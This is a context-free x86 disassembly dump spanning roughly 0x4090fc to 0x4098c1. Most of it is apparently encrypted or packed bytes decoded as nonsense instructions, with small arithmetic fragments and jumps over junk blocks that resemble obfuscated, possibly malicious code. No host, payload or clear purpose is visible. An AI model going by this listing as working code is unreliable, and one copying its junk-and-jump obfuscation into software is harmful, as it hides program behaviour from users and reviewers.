  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x4090fe
  409101:	dec    esp
  409102:	enter  0x98be,0x58
  409106:	push   ebp
  409107:	xor    al,0x2e
  409109:	stc    
  40910a:	fidivr DWORD PTR [ebp+0x7fe9f61]
  409110:	je     0x409157
  409112:	pop    esi
  409113:	out    dx,eax
  409114:	fistp  WORD PTR ds:0x6fef5eb4
  40911a:	inc    BYTE PTR [edx+0x11]
  40911d:	int    0x9d
  40911f:	dec    ecx
  409120:	stos   DWORD PTR es:[edi],eax
  409121:	adc    al,0x9
  409123:	jnp    0x409175
  409125:	(bad)  
  409126:	jnp    0x40914e
  409128:	call   0x14ff:0xcd3d114b
  40912f:	gs xor edx,0xda8b4e70
  409136:	mov    ?,esi
  409138:	out    0xf3,eax
  40913a:	sbb    al,0xaf
  40913c:	fstp   TBYTE PTR [bx+si+0x13fe]
  409141:	mov    bh,BYTE PTR [ecx+0x33]
  409144:	outs   dx,BYTE PTR ds:[esi]
  409145:	mov    dh,BYTE PTR [ecx]
  409147:	dec    esi
  409148:	adc    al,0x18
  40914a:	fidiv  DWORD PTR [esi]
  40914c:	in     al,0x6d
  40914e:	pop    es
  40914f:	adc    ecx,DWORD PTR [ecx-0x536453b0]
  409155:	sbb    dl,dl
  409157:	xchg   ecx,eax
  409158:	pop    es
  409159:	fsub   DWORD PTR [ebx]
  40915b:	out    dx,eax
  40915c:	xchg   esp,eax
  40915d:	mov    ebx,0x116afe3d
  409162:	icebp  
  409163:	pop    esp
  409164:	inc    ebp
  409165:	repz or ecx,DWORD PTR [ebx-0x7a46e02]
  40916c:	jmp    0x409179
  40916e:	shr    BYTE PTR [ebx],0x6
  409171:	adc    edi,DWORD PTR [ebp-0x4106d22a]
  409177:	add    bh,BYTE PTR [ecx+0x2f]
  40917a:	xchg   esi,eax
  40917b:	scas   eax,DWORD PTR es:[edi]
  40917c:	and    al,0xac
  40917e:	js     0x4091a3
  409180:	xchg   edi,eax
  409181:	std    
  409182:	idiv   DWORD PTR [ecx-0x4d4eb7de]
  409188:	gs pop ss
  40918a:	cmp    eax,0xee1ceb3d
  40918f:	ss sbb al,0xaa
  409192:	dec    edi
  409193:	cmc    
  409194:	mov    DWORD PTR [ebp-0x76b42f39],ebp
  40919a:	cmp    al,0x6
  40919c:	pop    DWORD PTR [ecx]
  40919e:	add    DWORD PTR [ecx-0x7f444841],0x688f6e6f
  4091a8:	xor    eax,0xef22cd59
  4091ad:	inc    edi
  4091ae:	icebp  
  4091af:	xor    dl,0x7a
  4091b2:	cmp    esp,DWORD PTR ds:0xcfca6053
  4091b8:	dec    esi
  4091b9:	sti    
  4091ba:	and    BYTE PTR [ebx-0x50125fdc],ch
  4091c0:	iret   
  4091c1:	sub    BYTE PTR [ecx-0x56],bl
  4091c4:	in     eax,0x9b
  4091c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091c7:	out    0x5f,eax
  4091c9:	sahf   
  4091ca:	scas   eax,DWORD PTR es:[edi]
  4091cb:	ret    0x15e3
  4091ce:	and    eax,0x1cde0b46
  4091d3:	add    ecx,DWORD PTR [ebp+0x7d9faea2]
  4091d9:	(bad)  
  4091da:	mov    esi,0xbe04fa97
  4091df:	shr    BYTE PTR [edx-0x6d],1
  4091e2:	es aaa 
  4091e4:	adc    BYTE PTR [esp+ebx*1],al
  4091e7:	rcl    DWORD PTR [eax+0x32],cl
  4091ea:	fwait
  4091eb:	push   edx
  4091ec:	sbb    ecx,DWORD PTR [ebx+0x66]
  4091ef:	test   eax,0x95591c71
  4091f4:	or     DWORD PTR [edi+0x1b],eax
  4091f7:	(bad)  
  4091f8:	int    0xe5
  4091fa:	jbe    0x409274
  4091fc:	aad    0xfa
  4091fe:	adc    DWORD PTR [eax],ecx
  409200:	imul   esi,esp,0x7b
  409203:	xchg   BYTE PTR [edi+ecx*2],al
  409206:	fidiv  WORD PTR [edx+0x28e06ded]
  40920c:	and    ebp,DWORD PTR [esi+eiz*2-0x2fa9ff6c]
  409213:	inc    ebx
  409214:	int3   
  409215:	cmp    bh,BYTE PTR [edx]
  409217:	es or  al,0x22
  40921a:	test   al,0x2f
  40921c:	cmp    DWORD PTR [ecx],esi
  40921e:	push   cs
  40921f:	sti    
  409220:	and    edx,eax
  409222:	repnz mov edx,DWORD PTR [eax-0x5d]
  409226:	xchg   edx,eax
  409227:	into   
  409228:	sub    esi,DWORD PTR [edi]
  40922a:	sbb    dh,dh
  40922c:	pop    edx
  40922d:	test   BYTE PTR [ecx-0x6a],al
  409230:	dec    ebp
  409231:	jmp    0xeee41c
  409236:	push   edi
  409237:	in     eax,dx
  409238:	leave  
  409239:	sub    DWORD PTR [ebp-0x54dfeb9e],ebp
  40923f:	dec    ebx
  409240:	(bad)  
  409241:	cmc    
  409242:	mov    bh,0x56
  409244:	shl    BYTE PTR [bx],0xf9
  409248:	xchg   DWORD PTR [edi],edx
  40924a:	sti    
  40924b:	xor    al,0x29
  40924d:	das    
  40924e:	adc    esp,DWORD PTR [esp+esi*2+0x3f]
  409252:	push   edi
  409253:	lods   eax,DWORD PTR ds:[esi]
  409254:	mov    ds:0x69fd80c7,al
  409259:	xchg   edi,eax
  40925a:	js     0x40923b
  40925c:	clc    
  40925d:	mov    cl,0xe9
  40925f:	push   esi
  409260:	arpl   WORD PTR [eax+0x4a72ed5d],bp
  409266:	inc    ecx
  409267:	mov    ecx,0xc06af6ad
  40926c:	(bad)  
  40926d:	jo     0x40921e
  40926f:	cmp    eax,0x9a315325
  409274:	test   al,0x25
  409276:	cs inc edi
  409278:	daa    
  409279:	std    
  40927a:	sahf   
  40927b:	loopne 0x4092e1
  40927d:	retf   
  40927e:	jg     0x40926b
  409280:	jb     0x40920d
  409282:	push   ss
  409283:	xor    cl,al
  409285:	lea    edx,[edi+esi*8+0xb]
  409289:	push   esi
  40928a:	dec    esp
  40928b:	mov    dh,0x56
  40928d:	adc    esp,DWORD PTR [ecx-0x3301b309]
  409293:	mov    ecx,DWORD PTR [edi]
  409295:	test   DWORD PTR [edi+0x71],ebp
  409298:	js     0x4092cf
  40929a:	cld    
  40929b:	add    edi,DWORD PTR [ebx-0x31]
  40929e:	pusha  
  40929f:	mov    al,0x8b
  4092a1:	xchg   DWORD PTR [eax-0x1373af18],eax
  4092a7:	mov    al,ds:0xcee3adfa
  4092ac:	pop    esi
  4092ad:	dec    edx
  4092ae:	lods   eax,DWORD PTR ds:[esi]
  4092af:	ins    BYTE PTR es:[edi],dx
  4092b0:	pusha  
  4092b1:	scas   eax,DWORD PTR es:[edi]
  4092b2:	cmc    
  4092b3:	pushf  
  4092b4:	push   0x94821598
  4092b9:	dec    esp
  4092ba:	in     eax,0x25
  4092bc:	clc    
  4092bd:	and    BYTE PTR [edi+0x67],ch
  4092c0:	data16 into 
  4092c2:	hlt    
  4092c3:	leave  
  4092c4:	add    DWORD PTR [edx+0x326ee744],0x8244149f
  4092ce:	cmp    ebx,ebx
  4092d0:	rcl    ch,cl
  4092d2:	adc    ch,BYTE PTR [edi]
  4092d4:	cli    
  4092d5:	jge    0x409335
  4092d7:	push   ss
  4092d8:	ror    BYTE PTR [ebx+esi*1+0x68],1
  4092dc:	mov    ebp,0xe42a3667
  4092e1:	mov    dl,0x90
  4092e3:	cmp    esp,ebp
  4092e5:	cdq    
  4092e6:	into   
  4092e7:	(bad)  
  4092e8:	fisttp DWORD PTR [edx-0x46]
  4092eb:	mov    cs:0x8ac9e5f3,al
  4092f1:	add    eax,0x104b39fc
  4092f6:	push   edi
  4092f7:	pop    ebp
  4092f8:	jno    0x409317
  4092fa:	inc    esi
  4092fb:	pop    edi
  4092fc:	mov    WORD PTR [ebp+0x7fce2e63],cs
  409302:	ins    DWORD PTR es:[edi],dx
  409303:	mov    edi,0x3bd01f44
  409308:	loop   0x409337
  40930a:	mov    ss,eax
  40930c:	mov    eax,0x6f6fa4ab
  409311:	test   edx,0x871b4071
  409317:	lods   eax,DWORD PTR ds:[esi]
  409318:	aad    0x18
  40931a:	ja     0x409362
  40931c:	xchg   BYTE PTR [edx],bh
  40931e:	call   0x9549:0x6da55567
  409325:	ficom  DWORD PTR [ecx]
  409327:	lahf   
  409328:	push   esp
  409329:	jne    0x40932b
  40932b:	inc    esp
  40932c:	fsub   QWORD PTR [ebp-0x6b3a90da]
  409332:	mov    ch,0x65
  409334:	sbb    edi,esi
  409336:	cwde   
  409337:	in     al,0x69
  409339:	pushf  
  40933a:	inc    edi
  40933b:	es mov dh,0xce
  40933e:	imul   BYTE PTR [esi]
  409340:	mov    ebx,0x5ae0c7eb
  409345:	push   esp
  409346:	(bad)  [esi-0x15be3426]
  40934c:	(bad)  
  40934d:	arpl   WORD PTR [edi],sp
  40934f:	call   0x9491:0x267db1eb
  409356:	js     0x409319
  409358:	jbe    0x409366
  40935a:	jecxz  0x4093a4
  40935c:	nop
  40935d:	cmp    dh,BYTE PTR [ecx]
  40935f:	loop   0x4092e6
  409361:	sbb    DWORD PTR [edi+0x1e],edx
  409364:	push   ss
  409365:	sbb    al,0xca
  409367:	inc    ebp
  409368:	repz push ebp
  40936a:	jp     0x409377
  40936c:	jle    0x40937c
  40936e:	inc    edx
  40936f:	mov    dh,0x9d
  409371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409372:	fnstsw WORD PTR [eax-0x51]
  409375:	mov    bl,0x49
  409377:	outs   dx,BYTE PTR ds:[esi]
  409378:	pop    ebx
  409379:	jp     0x40932b
  40937b:	loop   0x4093a2
  40937d:	mov    al,ds:0xd49527d2
  409382:	add    al,0x88
  409384:	pop    ds
  409385:	mov    ah,0x2b
  409387:	cs mov bh,0xc4
  40938a:	test   eax,0xcdf6c162
  40938f:	(bad)  
  409390:	jl     0x409384
  409392:	inc    esi
  409393:	shr    ebx,1
  409395:	pop    ebp
  409396:	repnz cli 
  409398:	xchg   edx,eax
  409399:	int3   
  40939a:	push   ebp
  40939b:	outs   dx,DWORD PTR ds:[esi]
  40939c:	test   DWORD PTR [esi+ebp*1],0x2281cfba
  4093a3:	fsub   DWORD PTR [edi-0x3c864f62]
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7d9,0x42a789
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x651bff3d
  4093fb:	jg     0x40947a
  4093fd:	xor    eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x4093ea
  409406:	jl     0x40945e
  409408:	int    0x4f
  40940a:	std    
  40940b:	xchg   BYTE PTR [ebx+0x45],ah
  40940e:	inc    ebx
  40940f:	push   edi
  409410:	mov    ecx,0x84b922ff
  409415:	mov    edx,esp
  409417:	pop    es
  409418:	adc    eax,0x7994d4e2
  40941d:	push   ss
  40941e:	imul   DWORD PTR [edi+edx*1+0x1f]
  409422:	popf   
  409423:	push   0xffffff96
  409425:	ret    
  409426:	in     eax,dx
  409427:	fsubr  QWORD PTR [ebp-0x7d]
  40942a:	dec    eax
  40942b:	add    DWORD PTR [ebp-0x9],eax
  40942e:	mov    ch,0xb7
  409430:	es jno 0x40941f
  409433:	daa    
  409434:	test   DWORD PTR [esi+ecx*4],0x13fb2f0a
  40943b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40943c:	inc    esp
  40943d:	push   ebp
  40943e:	in     al,0x5e
  409440:	jbe    0x40948f
  409442:	mov    bh,BYTE PTR [edx+0x1e]
  409445:	shr    al,1
  409447:	bound  esi,QWORD PTR [eax]
  409449:	lods   eax,DWORD PTR es:[esi]
  40944b:	mov    edx,0x88f37c04
  409450:	inc    eax
  409451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409452:	cmc    
  409453:	daa    
  409454:	repnz add ch,al
  409457:	sar    DWORD PTR [edx-0x27],0x66
  40945b:	or     DWORD PTR [eax+0x6b48e1d8],edi
  409461:	es sbb al,0x55
  409464:	call   0x8cc0804a
  409469:	sbb    BYTE PTR [ebp+0x74863113],bl
  40946f:	cmp    DWORD PTR [esi],eax
  409471:	cmp    edx,DWORD PTR [eax-0x54]
  409474:	loopne 0x4093fc
  409476:	lds    esp,FWORD PTR [ecx-0x259555dd]
  40947c:	pusha  
  40947d:	push   dx
  40947f:	shl    BYTE PTR [ebx-0x571e96fb],0xfa
  409486:	add    eax,0xc1c0b0c4
  40948b:	fcom   QWORD PTR [ebp-0x41]
  40948e:	inc    ebx
  40948f:	inc    eax
  409490:	and    cl,BYTE PTR [edi]
  409492:	and    BYTE PTR [edi-0x6231a89d],bl
  409498:	mov    esp,0xfcd57e5c
  40949d:	imul   esi,ecx,0xffffffab
  4094a0:	retf   
  4094a1:	push   es
  4094a2:	pop    ss
  4094a3:	jg     0x409425
  4094a5:	jge    0x409461
  4094a7:	ss out dx,eax
  4094a9:	mov    eax,ds:0x94bb2681
  4094ae:	cwde   
  4094af:	ret    
  4094b0:	push   0x17fc17c4
  4094b5:	add    ebx,DWORD PTR [edx]
  4094b7:	repnz xchg ebp,eax
  4094b9:	int    0x21
  4094bb:	lea    ebx,[esi]
  4094bd:	sbb    DWORD PTR [ecx-0x66aa45ed],ebp
  4094c3:	imul   esi,DWORD PTR [edi+edi*2],0x2b1303c9
  4094ca:	xchg   ebp,eax
  4094cb:	jmp    0x409497
  4094cd:	fistp  WORD PTR [ebp-0x21]
  4094d0:	and    eax,0x4e53a1df
  4094d5:	test   DWORD PTR [edi],ebx
  4094d7:	mov    BYTE PTR [ecx],cl
  4094d9:	pop    esp
  4094da:	mov    ds:0xf8288069,eax
  4094df:	stos   BYTE PTR es:[edi],al
  4094e0:	(bad)  
  4094e1:	and    ch,dh
  4094e3:	mov    edi,0xd7a67dee
  4094e8:	push   cs
  4094e9:	loopne 0x409497
  4094eb:	adc    DWORD PTR [eax-0xdf928f5],ebp
  4094f1:	adc    BYTE PTR [edx-0x50],bh
  4094f4:	and    BYTE PTR [edx+ebx*1-0x15f3cd7e],al
  4094fb:	in     al,0x5c
  4094fd:	repz (bad) ss:[ecx]
  409501:	lea    ebx,[esi+0x5d1c6000]
  409507:	sbb    DWORD PTR [eax-0x1709bf39],0x5427256a
  409511:	dec    eax
  409512:	popa   
  409513:	push   0x7feec9df
  409518:	xor    dl,BYTE PTR [esi]
  40951a:	in     eax,dx
  40951b:	push   edi
  40951c:	xor    BYTE PTR [edx],cl
  40951e:	cwde   
  40951f:	or     DWORD PTR [eax+0xf],esp
  409522:	outs   dx,DWORD PTR ds:[esi]
  409523:	cmp    eax,0x8454ec87
  409528:	xchg   ebp,eax
  409529:	cli    
  40952a:	imul   ecx,DWORD PTR [edx-0x3a],0xa0b3e6c9
  409531:	popf   
  409532:	or     bl,dl
  409534:	nop
  409535:	dec    eax
  409536:	rol    BYTE PTR [ebx],0x6
  409539:	push   ds
  40953a:	pop    ebp
  40953b:	stc    
  40953c:	push   ds
  40953d:	sahf   
  40953e:	xor    BYTE PTR gs:[edi-0x59],al
  409542:	xor    DWORD PTR [edi],eax
  409544:	or     al,0xc1
  409546:	in     al,dx
  409547:	xchg   edx,eax
  409548:	out    0x7,eax
  40954a:	fild   DWORD PTR [esi+0x79]
  40954d:	jl     0x409577
  40954f:	mov    BYTE PTR ds:0xecef518a,ah
  409555:	sbb    eax,0xfafd06d5
  40955a:	scas   al,BYTE PTR es:[edi]
  40955b:	jo     0x409551
  40955d:	sub    BYTE PTR [edi+0x74],0x40
  409561:	jecxz  0x4095d8
  409563:	sub    DWORD PTR ds:0x8381655d,ecx
  409569:	test   BYTE PTR [eax+0x1a],0x2
  40956d:	push   edi
  40956e:	out    dx,al
  40956f:	mov    cl,0x9a
  409571:	std    
  409572:	lahf   
  409573:	fnsave [edi+0x54]
  409576:	loopne 0x4095af
  409578:	xchg   esp,eax
  409579:	sub    eax,0xe522096
  40957e:	and    al,al
  409580:	rcr    BYTE PTR [ebp+edx*1+0x6147f933],0xec
  409588:	imul   esp,edx,0x14a8dddf
  40958e:	int3   
  40958f:	push   edx
  409590:	jmp    DWORD PTR [ecx]
  409592:	xor    DWORD PTR [esi],edx
  409594:	das    
  409595:	xchg   esi,eax
  409596:	xlat   BYTE PTR ds:[ebx]
  409597:	lock cmc 
  409599:	sub    ebx,DWORD PTR [ebx-0x5f]
  40959c:	xor    BYTE PTR [ecx],0x6
  40959f:	in     al,dx
  4095a0:	mov    dh,0xff
  4095a2:	xlat   BYTE PTR ds:[ebx]
  4095a3:	loope  0x40958b
  4095a5:	(bad)  
  4095a6:	sub    edi,DWORD PTR [esp+edx*4+0x67d48bca]
  4095ad:	call   0x2b6f8801
  4095b2:	cmp    eax,0x48ba87a8
  4095b7:	sub    cl,BYTE PTR gs:[eax+0x6f2143fb]
  4095be:	sub    eax,0x67606525
  4095c3:	and    al,0xf1
  4095c5:	sub    BYTE PTR [ecx-0xb],bh
  4095c8:	in     eax,0xda
  4095ca:	dec    eax
  4095cb:	pop    gs
  4095cd:	push   0xffffff91
  4095cf:	or     al,ah
  4095d1:	call   0xfc472312
  4095d6:	call   0x20b0c6f8
  4095db:	jb     0x409645
  4095dd:	in     al,0xa7
  4095df:	pushf  
  4095e0:	push   ss
  4095e1:	nop
  4095e2:	fisubr DWORD PTR [eax+0x7d]
  4095e5:	mov    esp,0xa08742c4
  4095ea:	mov    dh,0xdf
  4095ec:	aad    0x7
  4095ee:	sub    ecx,DWORD PTR [edi]
  4095f0:	pushf  
  4095f1:	pop    edx
  4095f2:	push   ds
  4095f3:	in     eax,dx
  4095f4:	sub    DWORD PTR ds:0xc3e985b9,0xffffffdb
  4095fb:	icebp  
  4095fc:	jl     0x40961c
  4095fe:	mov    esp,ecx
  409600:	inc    eax
  409601:	sbb    al,0x9a
  409603:	dec    ecx
  409604:	mov    bh,0x5c
  409606:	imul   ebx,DWORD PTR [esp+eax*8],0x8facd080
  40960d:	fisttp QWORD PTR [eax+0x46693a2d]
  409613:	(bad)  
  409614:	icebp  
  409615:	xchg   ecx,eax
  409616:	jae    0x409644
  409618:	les    ecx,FWORD PTR [eax+edx*1-0x5]
  40961c:	jg     0x4095ca
  40961e:	sbb    DWORD PTR [ebx+0x13],esi
  409621:	ds dec edi
  409623:	xchg   ebx,eax
  409624:	int3   
  409625:	dec    ebp
  409626:	test   DWORD PTR [ebx],edx
  409628:	fldcw  WORD PTR [esi-0x79]
  40962b:	jle    0x4095fd
  40962d:	sub    al,0x97
  40962f:	gs inc ecx
  409631:	inc    edi
  409632:	dec    DWORD PTR [ebp+0x2a624ff5]
  409638:	jo     0x4095c8
  40963a:	into   
  40963b:	mov    eax,DWORD PTR ds:0x82a70b51
  409641:	aaa    
  409642:	inc    esi
  409643:	stc    
  409644:	(bad)  [ecx+0x75890c7f]
  40964a:	and    cl,bl
  40964c:	push   ebp
  40964d:	repz sbb eax,0x66a0afe0
  409653:	es cld 
  409655:	xor    DWORD PTR [edi],0x1359b097
  40965b:	mov    dh,BYTE PTR [edi+0x70]
  40965e:	pop    edi
  40965f:	repnz aad 0x76
  409662:	or     eax,0xb0bfd821
  409667:	cmp    al,BYTE PTR [ebp-0xa]
  40966a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40966b:	dec    ecx
  40966c:	test   DWORD PTR [edi],ebx
  40966e:	lds    ecx,FWORD PTR [ecx]
  409670:	xchg   ecx,eax
  409671:	(bad)  
  409672:	dec    esp
  409673:	adc    dl,BYTE PTR [ebx]
  409675:	mov    ds:0x5d181ddd,al
  40967a:	xchg   edi,eax
  40967b:	cmp    ebp,DWORD PTR [ebx]
  40967d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40967e:	pslld  mm2,mm7
  409681:	jns    0x4096a0
  409683:	dec    esp
  409684:	pop    esi
  409685:	out    dx,al
  409686:	mov    ah,BYTE PTR [ebx]
  409688:	repz enter 0x76a6,0x61
  40968d:	jmp    0x66a3f9f5
  409692:	in     al,0xd5
  409694:	(bad)  
  409695:	xor    esp,edx
  409697:	sub    eax,0x365dd19d
  40969c:	leave  
  40969d:	jb     0x4096bb
  40969f:	repz pop edi
  4096a1:	jg     0x409626
  4096a3:	pusha  
  4096a4:	mov    ch,0xfe
  4096a6:	mov    ch,0xf4
  4096a8:	dec    ebp
  4096a9:	mov    ch,0xfc
  4096ab:	(bad)  
  4096ac:	mov    esi,0xfc458b46
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x31
  4096e4:	cmp    al,al
  4096e6:	out    0x5c,al
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409679
  4096f0:	loopne 0x40973a
  4096f2:	mov    dl,0x7c
  4096f4:	mov    BYTE PTR [edi],bl
  4096f6:	dec    ebp
  4096f7:	stos   BYTE PTR es:[edi],al
  4096f8:	loop   0x40975c
  4096fa:	jmp    0x409741
  4096fc:	into   
  4096fd:	sub    edi,DWORD PTR [ecx-0x3e6a0cb]
  409703:	adc    DWORD PTR [edx],edi
  409705:	repz daa 
  409707:	mov    WORD PTR [edx+0x7cab6f9],es
  40970d:	sub    ebp,DWORD PTR [esi]
  40970f:	xchg   BYTE PTR [ecx+0x2],dh
  409712:	call   0x147a9969
  409717:	xchg   edi,eax
  409718:	cmp    BYTE PTR [edx+0x25],bh
  40971b:	pop    ebx
  40971c:	out    0xa6,eax
  40971e:	and    ah,ch
  409720:	xchg   edx,eax
  409721:	fdivr  QWORD PTR [esi]
  409723:	ja     0x409793
  409725:	mov    ebx,edx
  409727:	mov    ecx,0xecada819
  40972c:	scas   al,BYTE PTR es:[edi]
  40972d:	es push cs
  40972f:	mov    edi,0xadf898a7
  409734:	cmp    DWORD PTR [ecx],esi
  409736:	lods   al,BYTE PTR ds:[esi]
  409737:	xor    eax,DWORD PTR [eax]
  409739:	xor    al,bh
  40973b:	mov    al,ds:0xdb09e942
  409740:	xchg   cl,ch
  409742:	xchg   BYTE PTR [ebp+0x15d64114],dl
  409748:	imul   eax,ebp,0x3c3d65f9
  40974e:	mov    dl,0x7e
  409750:	dec    edi
  409751:	rcl    DWORD PTR [edi+0x12],cl
  409754:	cwde   
  409755:	in     al,dx
  409756:	leave  
  409757:	addr16 add al,0xff
  40975a:	jge    0x409753
  40975c:	aaa    
  40975d:	int    0xd
  40975f:	loopne 0x40976e
  409761:	and    al,0xb0
  409763:	jle    0x4097e1
  409765:	div    DWORD PTR [ecx]
  409767:	add    ecx,DWORD PTR [eax+0x7e516a0c]
  40976d:	or     ch,BYTE PTR [ecx-0x576e996]
  409773:	in     al,0x41
  409775:	arpl   WORD PTR [ebp-0x45],bx
  409778:	imul   ebp,DWORD PTR [edi+0x1bed781f],0xffffffd9
  40977f:	sbb    BYTE PTR [eax],ch
  409781:	add    al,0x9
  409783:	mov    esp,DWORD PTR [edx]
  409785:	retf   
  409786:	stos   DWORD PTR es:[edi],eax
  409787:	xchg   ebp,eax
  409788:	and    BYTE PTR [ecx],al
  40978a:	popa   
  40978b:	pop    eax
  40978c:	mov    edi,0x1cb06cf3
  409791:	test   DWORD PTR [edx],0xc48b912d
  409797:	push   ecx
  409798:	xor    al,0x3a
  40979a:	push   ecx
  40979b:	hlt    
  40979c:	out    dx,al
  40979d:	jmp    0x4097ee
  40979f:	mov    WORD PTR [ecx-0x6d],?
  4097a2:	pop    esp
  4097a3:	test   al,0x4c
  4097a5:	pop    ebp
  4097a6:	lahf   
  4097a7:	adc    DWORD PTR [ebp+ebx*4+0x35],ebx
  4097ab:	cs inc edx
  4097ad:	push   ds
  4097ae:	lock dec ecx
  4097b0:	data16 or al,0xcd
  4097b3:	(bad)  
  4097b4:	jmp    FWORD PTR [edx]
  4097b6:	(bad)  
  4097b7:	cld    
  4097b8:	rcl    BYTE PTR [edx+0x72],1
  4097bb:	into   
  4097bc:	les    ebx,FWORD PTR [ebx+0x74ed8114]
  4097c2:	outs   dx,BYTE PTR ds:[esi]
  4097c3:	pop    esi
  4097c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c6:	shl    DWORD PTR [edi],0x3e
  4097c9:	out    0xe3,al
  4097cb:	or     BYTE PTR [eax],dl
  4097cd:	dec    eax
  4097ce:	xor    DWORD PTR [esp+edi*1+0x5e],eax
  4097d2:	lods   al,BYTE PTR ds:[esi]
  4097d3:	jmp    0xe217b4
  4097d8:	inc    di
  4097da:	dec    edx
  4097db:	jecxz  0x4097cc
  4097dd:	mov    bl,0x87
  4097df:	pop    esi
  4097e0:	adc    BYTE PTR cs:[ebx+ebx*1],0xc3
  4097e5:	lds    edi,FWORD PTR [ebx-0x31526ab1]
  4097eb:	inc    edx
  4097ec:	or     al,0x50
  4097ee:	dec    ebp
  4097ef:	scas   al,BYTE PTR es:[edi]
  4097f0:	out    0x69,al
  4097f2:	xor    BYTE PTR [edx+0x5],ch
  4097f5:	pushf  
  4097f6:	push   ebx
  4097f7:	arpl   WORD PTR ds:[esi+0x3ccc5c44],ax
  4097fe:	inc    esp
  4097ff:	jmp    0xae872373
  409804:	(bad)
  409808:	fsubr  st,st(3)
  40980a:	in     al,0xe6
  40980c:	pop    ebp
  40980d:	jp     0x4097fa
  40980f:	mul    BYTE PTR [edi]
  409811:	push   edx
  409812:	pop    ebx
  409813:	in     al,dx
  409814:	iret   
  409815:	jbe    0x4097b7
  409817:	add    DWORD PTR [ecx],edi
  409819:	xor    bl,ch
  40981b:	push   ebp
  40981c:	xor    eax,0xc126175b
  409821:	loop   0x4097d2
  409823:	or     BYTE PTR [eax+0x2b],0xaf
  409827:	push   ecx
  409828:	in     eax,dx
  409829:	pushf  
  40982a:	rcl    BYTE PTR [edx+0xd],1
  40982d:	push   edx
  40982e:	daa    
  40982f:	sub    BYTE PTR [ecx+0x2b],ah
  409832:	or     edx,DWORD PTR [ebp-0x271f27ff]
  409838:	outs   dx,BYTE PTR ds:[esi]
  409839:	sub    dh,BYTE PTR [ebx]
  40983b:	cwde   
  40983c:	fprem  
  40983e:	mov    cl,0x36
  409840:	lods   eax,DWORD PTR ds:[esi]
  409841:	into   
  409842:	inc    edi
  409843:	int    0xba
  409845:	aas    
  409846:	jnp    0x409841
  409848:	nop
  409849:	mov    bl,BYTE PTR [ebp-0x1f6aca06]
  40984f:	scas   al,BYTE PTR es:[edi]
  409850:	jmp    0xa9b17f8e
  409855:	rcr    DWORD PTR [ebx-0x35],0xc4
  409859:	and    bh,BYTE PTR [ebx]
  40985b:	jne    0x409819
  40985d:	cli    
  40985e:	xor    DWORD PTR [edx-0x71],ecx
  409861:	jb     0x40988e
  409863:	or     cl,bh
  409865:	dec    ebx
  409866:	fiadd  WORD PTR [edi]
  409868:	leave  
  409869:	ins    DWORD PTR es:[edi],dx
  40986a:	push   0x79
  40986c:	sub    BYTE PTR [ebp+ecx*1+0x31],ah
  409870:	repnz push ds
  409872:	cmc    
  409873:	aad    0xac
  409875:	inc    ecx
  409876:	push   esp
  409877:	push   cs
  409878:	fcom   st(3)
  40987a:	push   0xffffffb2
  40987c:	cmc    
  40987d:	push   ecx
  40987e:	jecxz  0x409831
  409880:	mov    dh,0xba
  409882:	les    ebp,FWORD PTR [edi]
  409884:	aas    
  409885:	and    eax,0xf7820ed1
  40988a:	adc    al,0x2
  40988c:	gs in  eax,0xfd
  40988f:	pop    esi
  409890:	sub    cl,BYTE PTR [edi-0x71ffeb1d]
  409896:	out    dx,eax
  409897:	icebp  
  409898:	sub    WORD PTR [ebx-0x5e67f178],bp
  40989f:	inc    ecx
  4098a0:	call   0xb24359f6
  4098a5:	dec    ebx
  4098a6:	cs or  eax,0x2ada5113
  4098ac:	iret   
  4098ad:	cmp    eax,0xa38b871f
  4098b2:	cli    
  4098b3:	inc    ebx
  4098b4:	and    bl,dl
  4098b6:	pop    es
  4098b7:	adc    dh,BYTE PTR [ebx]
  4098b9:	shl    ecx,cl
  4098bb:	daa    
  4098bc:	xchg   ecx,eax
  4098bd:	mov    esi,DWORD PTR [eax-0x7b]
  4098c0:	push   esp
  4098c1:	in     eax,0x1b
